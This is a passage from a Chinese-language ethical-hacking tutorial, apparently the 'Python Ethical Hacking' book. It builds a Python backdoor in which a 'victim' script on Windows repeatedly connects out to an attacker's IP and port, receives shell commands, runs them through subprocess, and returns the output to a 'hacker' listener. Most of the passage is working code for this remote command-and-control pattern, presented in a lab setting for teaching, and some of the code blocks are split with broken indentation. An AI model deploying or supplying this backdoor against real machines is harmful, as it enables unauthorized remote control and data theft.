

我们可以使用 close() 方法关闭套接字。完整的程序如下：

```
import socket

if __name__ == "__main__":
    victim_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    hacker_IP = "192.168.74.128"
    hacker_port = 8008
    hacker_address = (hacker_IP, hacker_port)
    victim_socket.connect(hacker_address)
    data = victim_socket.recv(1024)
    print(data.decode())
    victim_socket.close()
```

现在我们的黑客和受害者程序已以最简单的形式完成。黑客正在监听传入连接，而受害者尝试与黑客程序连接。一旦连接建立，黑客就会向受害者发送一条消息。受害者接收消息并简单地打印出来。双方随后关闭各自的连接。到目前为止我们所学的是通用的套接字编程。一旦我们了解如何在网络中的两台设备之间创建连接，我们就可以采用这些程序来创建恶意程序，从而允许黑客在受害者计算机上执行恶意活动。

让我们把这一切联系起来。首先运行黑客程序，然后运行受害者程序。这次，连接将被正确建立，并且在黑客机器上，你将看到以下输出：

![](img/d31345bbfd15f63be2920f0de5fa30dc_140_0.png)

同样，受害者将接收到消息并在屏幕上显示：

![](img/d31345bbfd15f63be2920f0de5fa30dc_140_1.png)

我们已经完成了拼图的一部分，即从受害者机器创建到黑客机器的成功连接，并在受害者机器上接收到黑客发送的一条小消息。这可能看起来不是一个大任务，但这是一个非常强大的工具。利用它，你基本上可以从黑客处获取命令。设计受害者程序在机器上运行这些命令并将结果发送回黑客。在下一节中，我们将学习如何从黑客机器向受害者机器发送命令并将结果发送回黑客。

## 在受害者机器上远程运行命令

我们已经在第 3 章《侦察和信息收集》中，在《创建 Python 脚本》部分，看到如何使用 Python 在计算机上运行命令。我们将在此知识的基础上构建一个恶意软件，该恶意软件将接收命令并在受害者机器上执行它们。我们之前的程序只是向受害者发送一条消息然后退出。这次，我们将修改程序使其做更多的事情。

在 Kali 机器上打开一个新项目以在受害者机器上执行命令并创建一个新文件。让我们首先建立连接：

```
import socket

if __name__ == "__main__":
    hacker_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    IP = "192.168.74.128"
    Port = 8008
    socket_address = (IP, Port)
    hacker_socket.bind(socket_address)
    hacker_socket.listen(5)
    print("listening for incoming connection requests")
    hacker_socket, client_address = hacker_socket.accept()
```

下一步涉及获取用户输入，即我们希望在受害者机器上运行的命令。获取输入后，我们必须将其转换为字节并通过连接发送到受害者程序：

```
command = input("Enter the command ")
hacker_socket.send(command.encode())
```

一旦命令发送，受害者端程序将负责执行它并返回结果。在这里，在黑客程序中，我们只需接收受害者返回的内容并将其打印为结果：

```
command_result = hacker_socket.recv(1048)
print(command_result.decode())
```

接下来，我们将把这放入一个循环中并添加退出条件：

```
while True:
    command = input("Enter the command ")
    hacker_socket.send(command.encode())
    if command == "stop":
        break
    command_result = hacker_socket.recv(1048)
    print(command_result.decode())
```

if 语句确保我们可以在需要时安全地退出此循环，以免陷入无限循环。此外，为了确保在执行期间遇到任何错误时正确关闭套接字，我们将添加 try-catch 块进行异常处理。用于执行命令的完整黑客程序如下所示：

```
import socket

if __name__ == "__main__":
    hacker_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    IP = "192.168.74.128"
    Port = 8008
    socket_address = (IP, Port)
    hacker_socket.bind(socket_address)
    hacker_socket.listen(5)
    print("listening for incoming connection requests")
    hacker_socket, client_address = hacker_socket.accept()
    print("connection established with ", client_address)
    try:
        while True:
            command = input("Enter the command ")
            hacker_socket.send(command.encode())
```

```
if command == "stop":
    break
    command_result = hacker_socket.recv(1048)
    print(command_result.decode())
except Exception:
    print("Exception occured")
    hacker_socket.close()
```

在受害者端，我们将接收黑客发送的命令并使用 subprocess 模块执行命令，最后将结果发送回黑客。这部分将在 Windows 10 机器上编码。让我们在 Windows 机器上创建一个新项目并尝试遵循与创建与黑客程序连接相同的步骤：

```
import socket
if __name__ == "__main__":
    victim_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    hacker_IP = "192.168.74.128"
    hacker_port = 8008
    hacker_address = (hacker_IP, hacker_port)
    victim_socket.connect(hacker_address)
```

正如我们在黑客程序中所看到的，我们有一个 while 循环来连续发送命令，我们将在此处采用类似的方法：

```
data = victim_socket.recv(1024)
    hacker_command = data.decode()
```

我们将在此处添加与黑客程序中相同的退出条件：

```
if hacker_command == "stop":
    break
```

![](img/d31345bbfd15f63be2920f0de5fa30dc_145_0.png)

图 6.7 – 黑客在受害者上执行命令

在这里，你可以看到黑客向受害者发送 ipconfig 命令。受害者程序读取命令，在受害者上执行它，并将结果发送回黑客。程序有一些小问题，我们现在将讨论。首先，受害者程序只尝试连接一次黑客，如果黑客没有监听，程序将抛出错误并退出。这并不理想，因为我们希望在需要时连接到受害者。为此，我们将把 connect() 方法放在循环内，以便它可以尝试持续与黑客建立连接，并且当黑客在线时，连接会立即建立。查看此处受害者程序的代码：https://github.com/PacktPublishing/Python-Ethical-Hacking/blob/main/example09-victim-malware/victim.py。

让我们现在看看在此程序中做出的更改。首先，有一个外部 while 循环。此循环的目的是不断尝试与黑客建立连接，如果发生错误，则等待 5 秒后再尝试重新连接。一旦在循环内部建立连接，就有一个内部循环确保黑客可以向受害者发送多个命令。通过使用 stop 命令，黑客可以退出此 while 循环。最后，如果你想关闭程序，还有一个键盘中断异常。按 Ctrl + C 退出程序。这样，此程序不会无限运行。

所以现在我们已经解决了第一个问题。现在我们需要只运行一次受害者程序，它将不断尝试与黑客连接，并且当黑客可用时，它将连接。我们的程序还有另一个小问题。当黑客程序要求输入命令时，如果我们只是按 Enter，它会引起问题，因为 Enter 不是有效命令。我们也需要处理它。为此，我们可以简单地包含一个检查，以确保黑客不会输入空命令。为此，输入以下命令：

```
if command == "":
    continue
```

我们将在黑客程序和受害者程序中都放置此检查。

最后，如果你仔细观察，我们只能发送和接收小于 1,024 字节的数据，因为在我们的接收函数中定义了这一点。任何超过此限制的数据将被截断。要更详细地查看，请转到 Windows 机器并运行任何结果超过 1,024 字节的命令。例如，让我们看看 systeminfo 命令。此命令输出系统信息，并且输出相对较大：

![](img/d31345bbfd15f63be2920f0de5fa30dc_146_0.png)

图 6.8 – systeminfo 结果

